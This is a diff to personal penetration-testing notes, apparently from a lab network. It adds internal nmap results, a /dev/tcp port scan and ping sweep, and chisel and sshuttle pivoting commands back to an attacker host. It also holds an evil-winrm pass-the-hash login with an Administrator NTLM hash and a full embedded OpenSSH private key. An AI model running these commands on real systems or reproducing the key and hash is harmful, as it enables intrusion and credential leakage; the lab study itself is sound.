@@ -26,6 +26,49 @@ PORT      STATE SERVICE  VERSION
 |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
 
 
+-----------------------------------------------------------------------------
+
+
+Internal NMAP scan:
+
+Nmap scan report for ip-10-200-180-100.eu-west-1.compute.internal (10.200.180.100)
+Host is up (0.000072s latency).
+All 6150 scanned ports on ip-10-200-180-100.eu-west-1.compute.internal (10.200.180.100) are in ignored states.
+Not shown: 6150 filtered tcp ports (no-response)
+MAC Address: 0A:09:1A:E2:A1:71 (Unknown)
+
+Nmap scan report for ip-10-200-180-150.eu-west-1.compute.internal (10.200.180.150)
+Host is up (0.00056s latency).
+Not shown: 6147 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+MAC Address: 0A:91:4C:D5:AE:71 (Unknown)
+
+Nmap scan report for ip-10-200-180-250.eu-west-1.compute.internal (10.200.180.250)
+Host is up (0.00064s latency).
+Not shown: 6148 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1337/tcp open  menandmice-dns
+MAC Address: 0A:83:89:8B:B1:C3 (Unknown)
+
+Nmap scan report for ip-10-200-180-200.eu-west-1.compute.internal (10.200.180.200)
+Host is up (0.0000080s latency).
+Not shown: 6144 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+443/tcp   open  https
+3306/tcp  open  mysql
+5355/tcp  open  hostmon
+10000/tcp open  ndmp
+
+
+
+
+-----------------------------------------------------------------------------
 
 Port 10000 vulnerable to a backdoor/rce .
 
@@ -40,4 +83,85 @@ Or a long version if the machine is blocking ICMP requests:
 
 for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done 
 
-for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
+for i in {1..255}; do (ping -c 1 10.200.180.${i} | grep "bytes from" &); done
+
+// 
+
+Chisel can used to create a reverse and forward proxy within a network. 
+
+For example we used a outward facing server that we can compromise and we can use chisel to create a forward proxy
+so that we can access the internal network using our attacking machine. Here is an example:
+
+On the attacking machine: 
+./chisel server -p LISTEN_PORT --socks5
+
+on the compromised machine: 
+./chisel client ATTACK_IP:ATTACK_LISTEN_PORT NEW_PROXY_PORT:socks
+
+Then we can use proxychains to communicate through this proxy. (unencrypted)
+
+
+Chisel can also be used to create a reverse/forward portforward if we dont have access to SSH to create a portforward with SSH
+
+-----------------------------------------------------------------------------
+
+
+Get back to current state: 
+sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa" 10.200.180.0/24 -x 10.200.180.200
+
+On Web server over SSH: ./chisel_1.11.3_linux_amd64_static server -p 1338 --reverse
+
+Login to git server: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
+On Git Server: ./chisel.exe client 10.200.180.200:1338 R:3333:10.200.180.100:80
+
+remeber to open port on firewall on web server using:
+firewall-cmd --zone=public --add-port PORT/tcp (we need 3333 for reverse proxy to personal computer running http on 80 @ 10.200.180.100)
+
+
+
+
+
+
+
+
+
+SSH KEY FOR USER ON FIRST NETWORK:
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
